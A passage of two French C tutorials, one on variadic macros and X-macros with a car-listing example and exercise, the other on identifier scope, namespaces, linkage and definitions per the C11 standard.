différence entre une fonction et une macro, c'est que la fonction est évaluée à l'exécution et la macro à la compilation. De ce fait, il faut que celle-ci soit entièrement connue à la compilation. Pour qu'une macro prenne un nombre variable d'arguments, il faut tout simplement utiliser les trois petits points : ... (comme une fonction). Aucun intérêt, parce que la macro n'est pas entièrement connue... Vous vous souvenez qu'une macro peut en appeler une autre ? Hé bien nous allons nous servir de ça ! Pour passer les arguments « variables » il va falloir utiliser la macro __VA_ARGS__ . Prenons notre exemple de EVALUE plus haut. Pour l'instant elle prend 3 arguments. Nous allons la modifier pour qu'elle prenne un nombre d'arguments variable. Ainsi on va faire une macro générique pour appeler plusieurs macros. Donc maintenant, sans toucher ni à MIN , ni à MAX , on obtient ça : #define MIN(x, y) (((x) < (y)) ? (x) : (y)) #define MAX(x, y) (((x) > (y)) ? (x) : (y)) /* Souvenez-vous, j'utilise '_' mais vous pouvez utiliser `macro' ou ce que vous voulez. * Du moment que ça reste un nom valide. */ #define EVALUE(_, ...) _(__VA_ARGS__) Si vous utilisez Visual: la macro __VA_ARGS__ n'a été introduite qu'à partir de la version 2005, de ce fait, si vous avez une version antérieure, ça ne fonctionnera pas. Les X-macros Nous arrivons à la partie la plus intéressante (mais aussi la plus compliquée) : les X-macros ! Que sont les X-macros ? Rassurez-vous ça n'a rien à voir avec des trucs cochons. :p Ça permet, dans le cas le plus simple, de faire simplement correspondre différentes valeurs entre elles (énumérations, structures, tableaux). Je prends l'exemple d'un marchand de voitures. Chaque voiture a une marque, un modèle, un prix, une couleur (et tout ce qui vous passe par la tête :D). Première émission de votre programme vous rentrez tout à la main (bon pas de problème c'est la première émission). Deuxième émission de votre programme vous devez rajouter plusieurs voitures, en modifier certaines et en supprimer. Oui mais voilà pour chercher les valeurs à modifier et à supprimer ce n'est pas forcement tâche facile. C'est là qu'interviennent les X-macros ! Grâce à ces macros particulières on verra que la tâche va être grandement simplifiée. Prenons notre exemple de voiture. En temps normal nous aurions fait 4 tableaux de chaînes de caractères. Je vais faire aussi une énumération pour permettre une recherche facile de notre voiture. (les valeurs ont été prises au hasard, ne venez pas me dire que le prix n'est pas bon etc, ce n'est qu'un exemple). enum index_e { Renault_Clio , Peugeot_207 , Citroen_C4 , NOMBRE_VOITURES }; char const * const marque_a [] = { \"Renault\" , \"Peugeot\" , \"Citroen\" }; char const * const modele_a [] = { \"Clio\" , \"207\" , \"C4\" }; int const prix_a [] = { 10000 , 12000 , 15000 }; char const * const couleur_a [] = { \"blanc\" , \"rouge\" , \"bleu\" }; Ce code est pratique. Si on cherche une voiture en particulier il suffit de prendre la valeur de l'énumération comme indice de chaque tableau : printf ( \"%s %s %d %s\" , marque_a [ Citroen_C4 ], modele_a [ Citroen_C4 ], prix_a [ Citroen_C4 ], couleur_a [ Citroen_C4 ]); Mais voilà, dès qu'on doit modifier, rajouter ou supprimer des modèles ça se révèle très peu pratique. Nous allons donc faire une X-macro qui va se charger de créer tout ça toute seule. C'est une macro qui fait appel à toute une série de macros qui portent le même nom. J'ai choisi ici de la nommer X_VOITURE . Elle appellera 3 « sous-macros » (normal on a 3 voitures :D) nommées X et contenant les éléments de nos voitures. Voilà comment elle est constituée : #define X_VOITURE \\ X(Renault, Clio, 10000, blanc) \\ X(Peugeot, 207, 12000, rouge) \\ X(Citroen, C4, 15000, bleu) C'est à partir de maintenant que toute la magie des X-macros se fait. Le principe est tout bête : afin de définir l'action de X_VOITURE , il faut tout d'abord définir X . Une fois X_VOITURE appelée il suffit d'utiliser la directive #undef X et de continuer. On redéfinit X , on appelle X_VOITURE et on la supprime. On recommence le processus partout où vous voulez utiliser votre X-macro. Grâce à ça, pour rajouter, modifier ou supprimer des informations sur nos voitures nous n'avons pas de problèmes ! Tout est répertorié au même endroit, il suffit de trouver la ligne concernée et de la modifier/supprimer ou d'en rajouter une. Si vous avez compris le principe vous ne devriez pas avoir de mal à implémenter ça ! #include <stdio.h> #include <stdlib.h> #define X_VOITURE \\ X(Renault, Clio, 10000, blanc) \\ X(Peugeot, 207, 12000, rouge) \\ X(Citroen, C4, 15000, bleu) /* Définit une macro qui concatène la marque, un underscore et le modèle. */ #define X(marque, modele, prix, couleur) marque ## _ ## modele , enum index_e { /* On appelle X_VOITURE qui appellera notre macro définie juste avant */ X_VOITURE NOMBRE_VOITURES }; /* On supprime notre macro X */ #undef X /* On définit de nouveau une macro X qui créera cette fois une * chaîne de caractère de la marque. */ #define X(marque, modele, prix, couleur) # marque , char const * const marque_a [] = { X_VOITURE }; #undef X /* On définit notre macro pour créer le modèle. */ #define X(marque, modele, prix, couleur) # modele , char const * const modele_a [] = { X_VOITURE }; #undef X /* On définit notre macro pour créer le prix. */ #define X(marque, modele, prix, couleur) prix , int const prix_a [] = { X_VOITURE }; #undef X /* On définit notre macro pour créer la couleur. */ #define X(marque, modele, prix, couleur) # couleur , char const * const couleur_a [] = { X_VOITURE }; #undef X int main ( void ) { int i ; /* Liste toutes les voitures répertoriées. * Le '-' juste après le % sert à justifier le texte à gauche. */ for ( i = 0 ; i < NOMBRE_VOITURES ; i ++ ) printf ( \"Marque: %-8s - Modele: %-5s - Prix: %-6d - Couleur: %-6s \\n \" , marque_a [ i ], modele_a [ i ], prix_a [ i ], couleur_a [ i ]); return EXIT_SUCCESS ; } C'est à partir de maintenant qu'on voit bien l'utilité d'utiliser un tel truc ! Maintenant si vous voulez modifier votre liste vous n'avez aucun mal, et tout le code sera modifié en conséquence. ;) #define X_VOITURE \\ X(Renault, Clio, 10000, blanc) \\ X(Renault, Laguna, 15000, vert) \\ X(Peugeot, 207, 12000, rouge) \\ X(Peugeot, 1007, 13000, noir) \\ X(Citroen, C4, 15000, bleu) Une autre alternative est de créer un fichier qui contiendra les appels aux macros et ensuite on inclut tout simplement notre fichier. L'extension du fichier n'a pas d'importance, mais on choisira en général .def . Fichier contenant les appels : X ( Renault , Clio , 10000 , blanc ) X ( Renault , Laguna , 15000 , vert ) X ( Peugeot , 207 , 12000 , rouge ) X ( Peugeot , 1007 , 13000 , noir ) X ( Citroen , C4 , 15000 , bleu ) Et le fichier contenant les inclusions : #include <stdio.h> #include <stdlib.h> #define X(marque, modele, prix, couleur) marque ## _ ## modele , enum index_e { # include \"Mes_Voitures.def\" NOMBRE_VOITURES }; #undef X #define X(marque, modele, prix, couleur) # marque , char const * const marque_a [] = { # include \"Mes_Voitures.def\" }; #undef X #define X(marque, modele, prix, couleur) # modele , char const * const modele_a [] = { # include \"Mes_Voitures.def\" }; #undef X #define X(marque, modele, prix, couleur) prix , int const prix_a [] = { # include \"Mes_Voitures.def\" }; #undef X #define X(marque, modele, prix, couleur) # couleur , char const * const couleur_a [] = { # include \"Mes_Voitures.def\" }; #undef X int main ( void ) { int i ; /* Liste toutes les voitures répertoriées. * Le '-' juste après le % sert à justifier le texte à gauche. */ for ( i = 0 ; i < NOMBRE_VOITURES ; i ++ ) printf ( \"Marque: %-8s - Modele: %-7s - Prix: %-6d - Couleur: %-6s \\n \" , marque_a [ i ], modele_a [ i ], prix_a [ i ], couleur_a [ i ]); return EXIT_SUCCESS ; } Si vous avez compris le principe des X-macros, ainsi que celui des macros à nombre variable d'arguments, vous allez pouvoir combiner les macros et les X-macros entre elles. Exercice Vous devez créer, à l'aide des macros et X-macros, une structure contenant 2 nombres de type int nommés x et y ainsi que 3 autres de type double nommés pythagore , sinx , siny . Vous devez définir une macro qui initialisera tous les champs de la structure à 0 , et une autre qui servira à afficher tous les champs de la structure. Solution : #include <stdio.h> #include <stdlib.h> #define X_DEF_STRUCT(type, variable, rien) type variable; #define X_PRINT_FORMAT_(type) X_PRINT_FORMAT_##type #define X_PRINT_FORMAT_double \"%f\" #define X_PRINT_FORMAT_int \"%d\" #define X_PRINT(type, variable, struct_nombres) \\ printf(\"%-7s %-10s : \" X_PRINT_FORMAT_(type) \"\\n\", \\ #type, #variable, struct_nombres->variable); #define X_INIT(type, variable, struct_nombres) \\ struct_nombres->variable = 0; #define DEC_NBVAR(_, ...) \\ _(int, x, __VA_ARGS__) \\ _(int, y, __VA_ARGS__) \\ _(double, pythagore, __VA_ARGS__) \\ _(double, sinx, __VA_ARGS__) \\ _(double, siny, __VA_ARGS__) struct nombres { DEC_NBVAR ( X_DEF_STRUCT , ) }; void initStruct ( struct nombres * s ) { DEC_NBVAR ( X_INIT , s ) } void printStruct ( struct nombres * s ) { DEC_NBVAR ( X_PRINT , s ) } int main ( void ) { struct nombres s ; initStruct ( & s ); printStruct ( & s ); puts ( \"\" ); return EXIT_SUCCESS ; } Voilà, vous en savez un peu plus sur le préprocesseur. Cependant en ce qui concerne les X-macros il faut éviter de les utiliser (voire pas du tout), ou si vous les utilisez il faut le faire avec précaution ! C'est source d'erreurs, et des erreurs difficiles à débugger. Faites attention à ne pas abuser des macros non plus, si elles sont mal utilisées, ça peut faire du code très difficile à lire. Exemple (merci SpaceFox ) : #define x = #define double(a,b) int #define char k['a'] #define union static struct J'espère que ça ne vous a pas paru trop compliqué. A bientôt ! ;)"},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/les-identificateurs-en-langage-c","title":"Les identificateurs en langage C","text":"Un identificateur peut être défini comme un nom permettant de désigner, de faire référence à une entité du langage. Un exemple d'identificateur bien connu est le nom d'une variable ou d'une fonction. Toutefois, un identificateur est plus qu'un simple nom et c'est ce qui est exposé dans ce cours. Remerciements : Je tiens à remercier Maëlan et Marc Mongenet pour leur relecture attentive de ce cours et leur aide dans son amélioration. Première approche Un identificateur est un nom qui permet de désigner une entité du langage. Oui, mais quelles entités ? La norme C11 en différencie huit types [1] (en comptant les membres de structures/unions/énumérations à part), à savoir les identificateurs : d'objet ; de fonction ; d'étiquette de structure/union/énumération, qui correspond au nom que vous donnez à votre structure/union/énumération ; de membre de structure/union/énumération ; de définition de type ( typedef ) ; d'étiquette, utilisée pour l'instruction de saut goto ; de macro ; de paramètre de macro. Note : En C, un objet est une zone mémoire pouvant contenir des données [2]. Afin d'illustrer cette énumération, voici un code déclarant un identificateur pour chacune des entités présentées ci‐dessus. #define identificateur_de_macro(identificateur_de_parametre_de_macro) struct identificateur_d_etiquette_de_structure { int identificateur_de_membre_de_structure ; }; typedef int identificateur_de_definition_de_type ; void identificateur_de_fonction ( void ) { int identificateur_d_objet ; identificateur_d_etiquette : ; } Note : Je ne parlerai pas des identificateurs de macro et de paramètre de macro dans la suite du tutoriel, ces derniers n'existant plus après traitement du code par le préprocesseur. [1] ISO/IEC JTC1/SC22/WG14, Doc. N1570, avril 2011, p. 35, § 6.2.1, al. 1. [2] Ibid. , p. 6, § 3.15, al. 1. Portée, espaces de noms et masquage Vous avez peut‐être remarqué que j'ai utilisé le terme déclaration dans la présentation, ce n'est pas anodin, il s'agit d'un concept fondamental du langage C permettant la création d'identificateurs. La notion de portée Une déclaration déclare un identificateur, c'est à dire qu'elle le rend utilisable, visible pour la suite du programme. On dit qu'une déclaration confère une portée à l'identificateur, c'est à dire une portion du programme où il sera utilisable. Il existe quatre types de portée [3] : au niveau d'un bloc ; au niveau d'un fichier ; au niveau d'une fonction ; au niveau d'un prototype. Cependant, je n'aborderai pas la portée au niveau d'un prototype dans la suite de ce cours, étant donné le peu d'intérêt de cette dernière. Au niveau d'un bloc Une portée au niveau d'un bloc signifie qu'un identificateur est utilisable, visible de sa déclaration jusqu'à la fin du bloc dans lequel il est déclaré. Ainsi, dans le code suivant : void f ( void ) { int n = 10 ; } void g ( void ) { n = 20 ; /* Incorrect */ } L'identificateur n ne peut pas être utilisé dans le bloc de la fonction g () car il a une portée limitée au bloc de la fonction f (). De même, le code suivant est erroné : int * p = & a ; /* Incorrect */ int a = 10 ; car au moment de la déclaration de l'identificateur p , l'identificateur a n'est pas encore déclaré, il est donc utilisé en dehors de sa portée. Au niveau d'un fichier Une portée au niveau d'un fichier signifie qu'un identificateur est utilisable, visible de sa déclaration jusqu'à la fin du fichier dans lequel il est déclaré. Pour obtenir un identificateur ayant une portée au niveau d'un fichier, il est nécessaire de le déclarer en dehors de tout bloc, par exemple comme ceci : int n ; void f ( void ) { n = 10 ; } void g ( void ) { n = 20 ; } Dans ce code, l'identificateur n a une portée au niveau du fichier et peut par conséquent être aussi bien utilisé dans la fonction f () que dans la fonction g (). Au niveau d'une fonction Une portée au niveau d'une fonction signifie qu'un identificateur est utilisable, visible dans toute la fonction où il est déclaré et ce, peu importe la position de sa déclaration. Cette portée est propre aux identificateurs d'étiquette, utilisés par l'instruction de saut goto . int main ( void ) { int n = 0 ; test : if ( ! n ) { goto dix ; } else { goto fin ; } dix : n = 10 ; goto test ; fin : return 0 ; } Comme vous le voyez, les identificateurs dix et fin peuvent être utilisés avant leur déclaration car ils ont une portée au niveau de la fonction main (). La notion d'espace de noms Le concept d' espace de noms n'est pas évident à définir, mais est par contre très facile à comprendre à l'aide d'un exemple. Sachez tout d'abord qu'il existe quatre espaces de noms [4] : un dédié aux identificateurs d'étiquettes ; un dédié aux identificateurs d'étiquettes de structures/unions/énumérations ; un dédié aux identificateurs de membres de structures ou unions ; un dédié à tous les autres identificateurs. Note : Avant la normalisation du langage en 1989, les champs de structures ou d'unions ne disposaient pas forcément d'un espace de noms distinct. Cela explique pourquoi certaines structures de la bibliothèque standard préfixent le nom de leur champ (c'est le cas de la structure tm par exemple). Ensuite, comme convenu, voici un exemple. int main ( void ) { struct test { int test ; }; struct test test ; goto test ; test : test . test = 10 ; return 0 ; } Comme vous le voyez, il y a quatre identificateurs déclarés avec le nom test : un identificateur d'étiquette de structure ( struct test , ligne 4) ; un identificateur de membre de structure ( int test , ligne 5) ; un identificateur d'objet ( struct test test , ligne 8) ; un identificateur d'étiquette ( test: , ligne 11). Ces quatre identificateurs ont tous une portée au niveau du bloc de la fonction main (). Ce code ne pose pourtant aucun problème, tout simplement parce que ces derniers appartiennent à quatre espaces de noms différents. Tout risque de confusion est évité de par : le contexte d'utilisation de l'identificateur (l'instruction goto attend un identificateur d'étiquette) ; l'utilisation de mots‐clés ( struct / union / enum pour désigner l'identificateur d'étiquette d'une structure/union/énumération) ; l'utilisation d'opérateurs (l'opérateur . ou ‐> pour accéder aux membres d'une structure/union) ; la syntaxe de la déclaration (par exemple les deux points suivant la déclaration d'un identificateur d'étiquette). La notion de masquage Une règle importante à retenir est qu'il n'est pas possible de déclarer deux identificateurs de même nom et de même espace de noms dans la même portée [5]. Ainsi, le code suivant est incorrect car il déclare deux identificateurs d'objet x dans le même espace de noms et dans la même portée. int main ( void ) { int x ; int x ; /* Incorrect */ return 0 ; } Maintenant, que se passe-t-il lorsque l'on déclare deux identificateurs de même nom et de même espace de noms, mais dans des portées différentes ? Autrement dit, que se passe‐t‐il dans ce cas ci ? #include <stdio.h> int n = 10 ; int main ( void ) { int n = 20 ; printf ( \"%d \\n \" , n ); return 0 ; } En fait, dans une telle hypothèse, c'est l'identificateur ayant la portée la plus faible qui sera privilégié. On dit qu'il masque celui ou ceux ayant une portée plus élevée [6] (en l'occurrence celui ayant une portée au niveau d'un fichier). Je dis : « celui ou ceux », car les identificateurs déclarés dans un sous‐bloc ont une portée plus faible que ceux déclarés dans le bloc supérieur. #include <stdio.h> int n = 10 ; int main ( void ) { int n = 20 ; if ( n == 20 ) { int n = 30 ; printf ( \"%d \\n \" , n ); } return 0 ; } Dans cet exemple, il y a trois identificateurs d'objet portant tous les trois le nom n : le premier a une portée au niveau du fichier ; le second au niveau du bloc de la fonction main () ; et le troisième au niveau du bloc du if . L'identificateur ayant une portée au niveau du fichier est donc masqué par celui ayant une portée au niveau du bloc de la fonction main (), qui est lui‐même masqué par celui ayant une portée au niveau du bloc du if . Si l'on exécute ce petit programme, il affichera donc 30. Notez que le masquage n'opère qu'une fois l'identificateur de portée plus faible déclaré. Ainsi, dans cet exemple : #include <stddef.h> #include <stdio.h> int x ; int main ( void ) { size_t x [ sizeof x ] = { sizeof x }; printf ( \"%zu %zu \\n \" , x [ 0 ], sizeof x ); return 0 ; } L'expression sizeof x utilisée pour déterminer la taille du tableau x va être évaluée en utilisant l'identificateur ayant une portée au niveau du fichier, le tableau n'étant pas encore déclaré à ce moment. Toutefois, la seconde expression sizeof x , utilisée pour initialiser le premier membre du tableau va, elle, utiliser l'identificateur ayant une portée au niveau du bloc de la fonction main () ce dernier étant désormais déclaré. [3] ISO/IEC JTC1/SC22/WG14, Doc. N1570, avril 2011, p. 35, § 6.2.1, al. 2. [4] Ibid. , p. 37, § 6.2.3, al. 1. [5] Ibid. , p. 35, § 6.2.1, al. 2. [6] Ibid. , p. 36, § 6.2.1, al. 4. Liaisons et définitions Dans le chapitre précédent, nous avons entre autres vu que les identificateurs étaient confinés à une portée et que cette dernière ne pouvait s'étendre au delà d'un fichier. Cependant, si cela s'arrêtait là, il ne serait pas possible d'utiliser des objets ou des fonctions d'autres fichiers. Autrement dit, l'exemple ci‐dessous serait incorrect et il serait nécessaire de n'utiliser qu'un seul fichier source, ce qui serait assez peu commode. — autre.c int f ( void ) { return 1 ; } — main.c int f ( void ); int main ( void ) { f (); return 0 ; } La notion de liaison Heureusement, il existe une solution : la notion de liaison . Chaque identificateur peut disposer d'une liaison qui peut être de deux types : externe ou interne [7]. Grâce à cette notion, il est possible de considéré un groupe d'identificateurs comme faisant référence à un même objet ou à une même fonction. En fait, elle permet de préciser que : tous les identificateurs avec liaison externe d'un même programme font référence au même objet ou à la même fonction [8] ; tous les identificateurs avec liaison interne d'un même fichier font référence au même objet ou à la même fonction [8]. Ainsi, si je reprends l'exemple donné au début de ce chapitre et que l'on considère que tous les identificateurs de fonction f () ont une liaison externe, on peut en déduire qu'en fait, ils font tous référence à la même fonction : celle du fichier autre.c . — autre.c int f ( void ) { return 1 ; } — main.c int f ( void ); int main ( void ) { f (); /* Retournera 1 */ return 0 ; } La même logique peut être appliquée pour une liaison interne, mis à part que le regroupement se limite à un fichier. En conséquence, dans l'exemple ci‐dessous, si l'on considère tous les identificateurs de fonction f () comme ayant une liaison interne, tous ceux situés dans le fichier main.c font référence à la fonction de ce fichier, alors que celui du fichier autre.c fait référence à celle située en son sein. — autre.c int f ( void ) { return 1 ; } — main.c int f ( void ) { return 2 ; } int main ( void ) { f (); /* Retournera 2 */ return 0 ; } Conditions d'attribution Maintenant que vous connaissez la notion de liaison, il reste encore à déterminer dans quelles conditions cette dernière est attribuée à un identificateur. En fait, la présence d'une liaison et son type sont déterminés par la position de la déclaration de l'identificateur ainsi que par l'utilisation des mots‐clés extern et static . Concrètement, cela se détermine suivant les règles exposées ci‐dessous. Un identificateur de fonction ou d'objet ayant une portée au niveau d'un fichier a une liaison externe [9] [10], sauf si sa déclaration est précédée du mot‐clé static , auquel cas il a une liaison interne [11]. int a ; /* Liaison externe */ static int b ; /* Liaison interne */ void f ( void ); /* Liaison externe */ static void g ( void ); /* Liaison interne */ Un identificateur d'objet déclaré à l'intérieur d'un bloc n'a pas de liaison sauf s'il est précédé du mot‐clé extern (voyez la règle suivante) [12]. { int a ; /* Pas de liaison */ } Un identificateur d'objet ou de fonction dont la déclaration est précédée du mot‐clé extern a une liaison externe sauf si une déclaration du même identificateur la précède, auquel cas il a la même liaison que ce dernier [13]. Note : Dans le cas où une déclaration d'un identificateur de fonction n'est précédée, ni du mot‐clé static , ni du mot‐clé extern , le mot‐clé extern est implicitement ajouté [14]. Ces règles peuvent paraître quelque peu indigestes, aussi, voici un exemple illustrant chacune de ces dernières. /* * « a » est un identificateur d'objet déclaré en dehors de tout bloc. * Il a donc une liaison externe. */ int a ; /* * « b » est un identificateur d'objet déclaré en dehors de tout bloc. * Sa déclaration est précédée du mot‐clé « static ». * Il a donc une liaison interne. */ static int b ; /* * « c » est un identificateur d'objet déclaré en dehors de tout bloc. * Sa déclaration est précédée du mot‐clé « extern ». * Aucune déclaration du même identificateur ne le précède. * Il a donc une liaison externe. */ extern int c ; /* * « f » est un identificateur de fonction. * Sa déclaration n'est pas précédée du mot‐clé « extern » ou « static ». * Dès lors, il faut faire comme si elle était précédée du mot‐clé « extern ». * Aucune déclaration du même identificateur ne le précède. * Il a donc une liaison externe. */ void f ( void ); /* * « g » est un identificateur de fonction. * Sa déclaration est précédée du mot‐clé « static ». * Il a donc une liaison interne. */ static void g ( void ); /* * « h » est un identificateur de fonction. * Sa déclaration est précédée du mot‐clé « extern ». * Aucune déclaration du même identificateur ne le précède. * Il a donc une liaison externe. */ extern void h ( void ); int main ( void ) { /* * « a » est un identificateur d'objet déclaré à l'intérieur d'un bloc. * Sa déclaration est précédée du mot‐clé « extern ». * Il existe déjà une autre déclaration de celui‐ci avec liaison externe. * Il a donc une liaison externe. */ extern int a ; /* * « b » est un identificateur d'objet déclaré à l'intérieur d'un bloc. * Sa déclaration est précédée du mot‐clé « extern ». * Il existe déjà une autre déclaration de celui‐ci avec liaison interne. * Il a donc une liaison interne. */ extern int b ; /* * « c » est un identificateur d'objet déclaré à l'intérieur d'un bloc. * Sa déclaration n'est pas précédé du mot‐clé « extern ». * Il n'a donc pas de liaison. */ int c ; /* * « d » est un identificateur d'objet déclaré à l'intérieur d'un bloc. * Sa déclaration est précédée du mot‐clé « extern ». * Aucune déclaration du même identificateur ne le précède. * Il a donc une liaison externe. */ extern int d ; /* * « g » est un identificateur de fonction. * Sa déclaration n'est pas précédée du mot‐clé « extern ». * Dès lors, il faut faire comme si elle était précédée du mot‐clé « extern ». * Il existe déjà une autre déclaration de celui‐ci avec liaison interne. * Il a donc une liaison interne. */ void g ( void ); return 0 ; } Note : Le mot‐clé static ne peut être utilisé, pour modifier la liaison d'un identificateur, qu'en dehors de tout bloc et ce, aussi bien pour les identificateurs d'objet que les identificateurs de fonction [15] [16]. La notion de définition Je vous ai dit que la notion de liaison permettait de grouper des identificateurs et de les considérer comme faisant référence au même objet ou à la même fonction. Je vous ai également dit que tous les identificateurs avec liaison externe d'un même programme font référence au même objet ou à la même fonction et que tous les identificateurs avec liaison interne d'un même fichier font référence au même objet ou à la même fonction. Cependant, il y a un corollaire qui découle de ces deux règles : il ne peut exister qu' un seul objet ou qu' une seule fonction qui puisse être référencé par le groupe d'identificateurs. Au fond, c'est assez logique. Prenez l'exemple ci‐dessous, l'identificateur de fonction f déclaré dans le bloc de la fonction main () a une liaison interne. Cependant, laquelle des deux fonctions désigne‐t‐il ? La première ? La deuxième ? Les deux ? static int f ( void ) { return 1 ; } static int f ( void ) { return 2 ; } int main ( void ) { static int f ( void ); f (); return 0 ; } Il est impossible de le dire, il faudrait qu'il n'existe qu'une seule fonction ou, dit plus formellement, qu'il n'y ait qu'une seule définition de la fonction f (). Qu'est‐ce qu'une définition ? C'est ce que nous allons voir tout de suite. Les identificateurs de fonction Une définition d'un identificateur de fonction est une déclaration qui comporte le corps de la fonction [17]. Autrement dit, dans le code ci‐dessous, le premier élément est une déclaration de l'identificateur de fonction f alors que le deuxième est une définition de l'identificateur de fonction f (car il comporte le corps de celle-ci) . /* Déclaration */ int f ( void ); /* Définition */ int f ( void ) { return 1 ; } Les identificateurs d'objet Une définition d'un identificateur d'objet est une déclaration qui alloue l'objet qu'il référence [17]. Vous voilà bien peu avancé... Heureusement, il y a une règle simple et absolue pour différencier une déclaration et une définition d'un identificateur d'objet : une déclaration d'un identificateur d'objet, en dehors de tout bloc, comportant une initialisation est une définition [18]. Dans tous les autres cas, il s'agit d'une déclaration. int a ; /* Déclaration */ static int b ; /* Déclaration */ extern int c ; /* Déclaration */ int d = 10 ; /* Définition */ Cependant, il y a une (petite) subtilité : les déclarations d'identificateurs d'objet, en dehors de tout bloc, à l'exception de celles précédées du mot‐clé extern , sont appelées des définitions potentielles . Et, dans le cas où un fichier comprend une ou plusieurs définitions potentielles d'un identificateur d'objet mais aucune définition de cet identificateur, une définition est implicitement incluse au début du fichier avec un initialiseur valant zéro [19]. Rassurez-vous, nous allons revoir cela en douceur. Avant toute chose, il est nécessaire de bien différencier une déclaration, une définition potentielle et une définition d'un identificateur d'objet. Pour ce faire, voici un exemple simple. /* * Cette déclaration ne comporte pas d'initialisation. * Elle n'est pas précédée du mot‐clé « extern ». * Il s'agit donc d'une définition potentielle. */ int n ; /* * Cette déclaration comporte une initialisation. * Il s'agit donc d'une définition. */ extern int n = 10 ; /* * Cette déclaration ne comporte pas d'initialisation. * Elle n'est pas précédée du mot‐clé « extern ». * Il s'agit donc d'une définition potentielle. */ static int n ; /* * Cette déclaration ne comporte pas d'initialisation. * Elle est précédée du mot‐clé « extern ». * Il s'agit donc d'une déclaration. */ extern int n ; Ensuite, reprenons cette règle pas à pas à l'aide du code ci‐dessous. int n ; int main ( void ) { return n ; } Comme vous le voyez, nous avons un fichier comprenant une définition potentielle de l'identificateur d'objet n , mais aucune définition de cet identificateur. Ce que dit l'obscure règle que je vous ai présentée auparavant, c'est que dans le cas où un fichier comprend une ou plusieurs définitions potentielles d'un identificateur mais aucune définition de cet identificateur (ce qui est le cas de notre fichier), une définition est implicitement inclue au début de ce fichier avec un initialiseur valant zéro. Autrement dit, appliquée à notre exemple, cela donne ceci : /* Définition implicite */ int n = 0 ; int n ; int main ( void ) { return n ; } Formalisation de l'interdiction Maintenant que nous avons vu la notion de définition, il m'est possible de formaliser ce que je vous ai dit au début de la présentation de cette notion : il ne peut exister qu'un seul objet ou qu'une seule fonction qui puisse être référencée par un groupe d'identificateur. Ou, dit de manière plus formelle : il ne peut y avoir qu'une seule définition d'un même identificateur avec liaison externe dans tout le programme [20] ; il ne peut y avoir qu'une seule définition d'un même identificateur avec liaison interne dans un même fichier [21] ; Note : Certains compilateurs (gcc pour ne citer que lui) sont par défaut capables de gérer certains cas de définitions multiples. Sachez cependant qu'il s'agit d'une extension non standard. Dans le cas de gcc, il est possible de désactiver cette extension en utilisant l'option ‐fno‐common . Le code ci‐dessous est donc incorrect car il comporte plus d'une définition avec liaison interne de l'identificateur n . static int n = 10 ; static int n = 20 ; int main ( void ) { return n ; } De même, le code qui suit est faux car il existe plus d'une définition avec liaison externe de l'identificateur n dans tout le programme (n'oubliez pas la définition implicite !). — autre.c int n = 10 ; — main.c int n ; int main ( void ) { return n ; } Notez enfin que si un identificateur apparaît dans un fichier avec à la fois une liaison externe et interne, le résultat est indéterminé [22]. — autre.c int f ( void ) { return 1 ; } — main.c int f ( void ); static int f ( void ) { return 2 ; } int main ( void ) { f (); return 0 ; } Dans cet exemple, l'identificateur f () du fichier main.c a à la fois une liaison externe et interne. Il est donc impossible de dire à quelle fonction il fait référence. En Bref Que retenir de ce chapitre si ce n'est qu'il est affreusement théorique et complexe ? En fait, il est possible d'en déduire une méthode générale afin de partager des variables ou des fonctions entre plusieurs fichiers source. Étant donné que les fichiers d'en‐têtes sont très souvent inclus dans plusieurs fichiers (pensez à ceux de la bibliothèque standard par exemple), ces derniers ne doivent contenir que des déclarations. En effet, si ce n'est pas le cas, vous allez vous retrouver avec des définitions multiples (explicites ou implicites) et, dès lors, rencontrer des erreurs lors de la compilation. Les fichiers source, quant à eux, recueillent donc les définitions. Ainsi, lorsque vous souhaitez utiliser une ou plusieurs variables ou fonctions définies dans un autre fichier, vous incluez le ou les fichiers d'en‐tête comprenant leur déclarations dans les fichiers source où vous souhaitez les utiliser. Cette méthode a l'avantage d'éviter d'avoir à réécrire toutes les déclarations dans chaque fichier. L'exemple ci‐dessous illustre ce qui vient d'être exposé. — autre.h #ifndef AUTRE_H #define AUTRE_H extern int n ; /* Déclaration */ extern void setn ( int ); /* Déclaration */ #endif /* !AUTRE_H */ — autre.c /* Inclusion des déclarations */ #include \"autre.h\" /* Définition potentielle */ int n ; /* Définition */ void setn ( int a ) { n = a ; } — main.c /* Inclusion des déclarations */ #include <stdio.h> #include \"autre.h\" int main ( void ) { printf ( \"%d \\n \" , n ); /* 0 */ setn ( 99 ); printf ( \"%d \\n \" , n ); /* 99 */ return 0 ; } [7] ISO/IEC JTC1/SC22/WG14, Doc. N1570, avril 2011, p. 36, § 6.2.2, al. 1. [8] Ibid. , p. 36, § 6.2.2, al. 2. [9] Ibid. , p. 37, § 6.2.2, al. 5. [10] Ibid. , p. 37, § 6.2.2, al. 5. [11] Ibid. , p. 36, § 6.2.2, al. 3. [12] Ibid. , p. 37, § 6.2.2, al. 6. [13] Ibid. , p. 37, § 6.2.2, al. 4. [14] Ibid. , p. 37, § 6.2.2, al. 5. [15] Ibid. , p. 38, § 6.2.4, al. 3. [16] Ibid. , p. 110, § 6.7.1, al. 7. [17] Ibid. , p. 108, § 6.7, al. 5. [18] Ibid. , p. 158, § 6.9.2, al. 1. [19] Ibid. , p. 158, § 6.9.2, al. 2. [20] Ibid. , p. 155, § 6.9, al. 5. [21] Ibid. , p. 155, § 6.9, al. 3. [22] Ibid. , p. 37, § 6.2.2, al. 7. Les noms Nous allons à présent terminer notre tour d'horizon des identificateurs avec un sujet plus léger et plus simple : le nom des identificateurs. Caractères utilisables Un nom est composé d'une suite de lettres et de chiffres. Oui, mais quelles lettres et quels chiffres ? La liste exhaustive nous est donnée par la norme [23]. a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9 _ Sachez qu'un nom ne peut pas commencer par un chiffre, il doit obligatoirement débuter par une lettre ou par un underscore [24]. Noms réservés par le langage Nous savons désormais de quels caractères peuvent être composés nos noms. Cependant, tous les noms ne sont pas utilisables. En effet, certains sont réservés par le langage C lui‐même et ne sont donc pas disponibles [25]. auto if unsigned break inline void case int volatile char long while const register _Alignas continue restrict _Alignof default return _Atomic do short _Bool double signed _Complex else sizeof _Generic enum static _Imaginary extern struct _Noreturn float switch _Static_assert for typedef _Thread_local goto union Il est à noter que certaines implémentations réservent aussi les mots asm et fortran . Il est donc également préférable de les éviter. Noms réservés par la bibliothèque standard À côté des noms réservés par le langage lui‐même, il y a ceux réservés par la bibliothèque standard. En fait, tous les noms de 